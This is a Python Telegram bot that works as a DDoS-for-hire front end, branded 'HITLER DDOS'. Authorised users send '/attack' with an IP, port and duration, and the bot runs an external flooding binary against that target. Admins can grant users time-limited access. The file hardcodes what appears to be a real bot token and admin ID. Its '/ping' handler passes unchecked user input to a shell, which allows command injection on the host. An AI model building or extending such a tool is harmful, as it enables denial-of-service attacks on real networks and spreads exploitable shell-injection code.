import telebot
import subprocess
import datetime
import os
import re
import time

bot = telebot.TeleBot("8719357513:AAFcMhvlS9n0MsLoul353QrnD0VAINxozp0")
ADMIN_IDS = ["7967113651"]
USER_FILE = "users.txt"
user_approval_expiry = {}

def read_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f: return f.read().splitlines()
    return []

allowed_users = read_users()

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🚀 HITLER DDOS READY\n/attack <ip> <port> <time>\n/ping <ip>\n/add <id> <time>")

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    try:
        cmd = message.text.split()
        target_id, duration_str = cmd[1], cmd[2].lower()
        num = int(re.search(r'\d+', duration_str).group())
        unit = re.search(r'[a-z]+', duration_str).group()
        if target_id not in allowed_users:
            allowed_users.append(target_id)
            with open(USER_FILE, "a") as f: f.write(f"{target_id}\n")
        expiry = datetime.datetime.now() + (datetime.timedelta(hours=num) if 'hour' in unit else datetime.timedelta(days=num))
        user_approval_expiry[target_id] = expiry
        bot.reply_to(message, f"✅ User {target_id} Added")
    except: bot.reply_to(message, "Usage: /add <id> 1day")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    uid = str(message.chat.id)
    if uid in allowed_users or uid in ADMIN_IDS:
        try:
            cmd = message.text.split()
            target, port, duration = cmd[1], cmd[2], cmd[3]
            bot.reply_to(message, f"🚀 ATTACK SENT: {target}:{port}")
            subprocess.run(f"./king {target} {port} {duration} 900", shell=True)
            bot.send_message(message.chat.id, f"✅ FINISHED: {target}:{port}")
        except: bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
    else: bot.reply_to(message, "❌ Access Denied")

@bot.message_handler(commands=['ping'])
def ping(message):
    try:
        target = message.text.split()[1]
        res = subprocess.run(f"ping -c 4 {target}", shell=True, capture_output=True, text=True)
        bot.reply_to(message, f"📊 Ping Result:\n{res.stdout if res.returncode == 0 else 'Unreachable'}")
    except: pass

while True:
    try: bot.polling(none_stop=True)
    except: time.sleep(5)
